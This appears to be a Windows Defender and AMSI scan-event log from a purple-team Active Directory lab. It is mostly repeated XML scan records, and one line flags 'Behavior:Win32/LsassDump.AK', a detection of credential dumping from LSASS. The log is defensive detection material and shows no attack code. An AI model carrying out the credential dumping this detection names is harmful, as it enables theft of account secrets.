		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="Path">MemScanVfz-AMSI-86BAD65B-1BBC-3524-F684-A14FAE4116F6</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Data Name="FirstParam">AmsiScan</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>SmsScanTask</Task>
		<Data Name="ScanSource">       0</Data>
		<Data Name="FirstParam">sigseq=0x85b351bc4771;level=M;reason=max_scan;scancnt=2</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>SmsScanTask</Task>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Path">MemScanVfz-AMSI-86BAD65B-1BBC-3524-F684-A14FAE4116F6</Data>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Task>SmsScanTask</Task>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Path">MemScanVfz-AMSI-EEB6A63D-4BFB-CF3F-C78B-D3906EA82CBA</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Data Name="FirstParam">AmsiScan</Data>
		<Data Name="Path">MemScanVfz-AMSI-EEB6A63D-4BFB-CF3F-C78B-D3906EA82CBA</Data>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      34</Data>
		<Task>Scan request </Task>
		<Message>Start of engine scan request </Message>
		<Data Name="ScanReason">2</Data>
		<Opcode>SmsScanStart</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanReason">2</Data>
		<Data Name="ScanResult">5</Data>
		<Opcode>SmsScanStop</Opcode>
		<Task>SmsScanTask</Task>
		<Task>SmsScanTask</Task>
		<Data Name="Scan Source">      34</Data>
		<Task>Scan request </Task>
		<Message>End of engine scan request </Message>
		<Data Name="FirstParam">sigseq=0x85b351bc4771;level=1;reason=max_scan;scancnt=1</Data>
		<Data Name="Scan Source">      34</Data>
		<Task>Scan request </Task>
		<Message>Start of engine scan request </Message>
		<Data Name="ScanReason">2</Data>
		<Opcode>SmsScanStart</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanReason">2</Data>
		<Data Name="ScanResult">5</Data>
		<Opcode>SmsScanStop</Opcode>
		<Task>SmsScanTask</Task>
		<Task>SmsScanTask</Task>
		<Data Name="Scan Source">      34</Data>
		<Task>Scan request </Task>
		<Message>End of engine scan request </Message>
		<Data Name="FirstParam">sigseq=0x99b30a428ca6;level=1;reason=max_scan;scancnt=1</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      28</Data>
		<Task>Scan request </Task>
		<Message>Start of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      28</Data>
		<Task>Scan request </Task>
		<Message>End of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      30</Data>
		<Task>Scan request </Task>
		<Message>Start of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      30</Data>
		<Task>Scan request </Task>
		<Message>End of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      28</Data>
		<Task>Scan request </Task>
		<Message>Start of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      28</Data>
		<Task>Scan request </Task>
		<Message>End of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      30</Data>
		<Task>Scan request </Task>
		<Message>Start of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Scan Source">      30</Data>
		<Task>Scan request </Task>
		<Message>End of engine scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="VName">Behavior:Win32/LsassDump.AK</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="Path">MemScanVfz-AMSI-5CDACCAB-04BE-2F78-9120-6402E5B609AD</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Data Name="FirstParam">AmsiScan</Data>
		<Data Name="Path">MemScanVfz-AMSI-5CDACCAB-04BE-2F78-9120-6402E5B609AD</Data>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>


*Part of the [AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research) series — purple team attack chains with paired detection engineering.*
